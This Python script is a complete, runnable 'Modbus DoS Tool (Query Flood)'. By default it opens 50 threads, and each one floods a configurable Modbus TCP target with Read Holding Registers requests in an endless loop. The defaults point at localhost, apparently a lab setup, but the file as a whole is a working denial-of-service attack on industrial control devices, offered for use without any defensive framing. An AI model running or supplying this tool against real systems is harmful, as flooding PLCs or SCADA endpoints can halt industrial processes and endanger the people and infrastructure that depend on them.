import sys
import time
import socket
import argparse
import threading
import inspect
from pymodbus.client import ModbusTcpClient

def get_unit_kwargs(method, unit_id):
    """Dynamically determine the right unit argument (slave/unit/device_id) based on PyModbus version."""
    sig = inspect.signature(method)
    if 'device_id' in sig.parameters:
        return {'device_id': unit_id}
    elif 'slave' in sig.parameters:
        return {'slave': unit_id}
    else:
        return {'unit': unit_id}

# Global flag to stop the threads
stop_threads = False

def flood_modbus(target_ip, target_port):
    """Flood the target with Modbus Read Holding Registers requests."""
    client = ModbusTcpClient(target_ip, port=target_port)
    packet_count = 0
    
    try:
        if not client.connect():
            print(f"[-] Thread {threading.get_ident()}: Failed to connect to {target_ip}:{target_port}")
            return

        while not stop_threads:
            # Send a Read Holding Registers request (Function 03)
            kwargs = get_unit_kwargs(client.read_holding_registers, 1)
            rr = client.read_holding_registers(address=0, count=10, **kwargs)
            packet_count += 1

        client.close()
    except Exception as e:
        print(f"[-] Thread {threading.get_ident()}: Error during flood: {e}")
    
    print(f"[+] Thread {threading.get_ident()}: Sent {packet_count} packets.")

def run_dos(target_ip, target_port, threads):
    """Launch multi-threaded DoS attack."""
    print(f"[*] Starting Modbus Query Flood against {target_ip}:{target_port}")
    print(f"[*] Threads: {threads}")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood_modbus, args=(target_ip, target_port))
        thread_list.append(t)
        t.start()

    # Wait for threads to finish (which they won't unless stop_threads is true)
    for t in thread_list:
        t.join()

    print("[*] Attack Finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus DoS Tool (Query Flood)")
    parser.add_argument("--target", default="localhost", help="Target IP address (default: localhost)")
    parser.add_argument("--port", type=int, default=5002, help="Target Port (default: 5002)")
    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent threads (default: 50)")

    args = parser.parse_args()

    try:
        run_dos(args.target, args.port, args.threads)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
        stop_threads = True
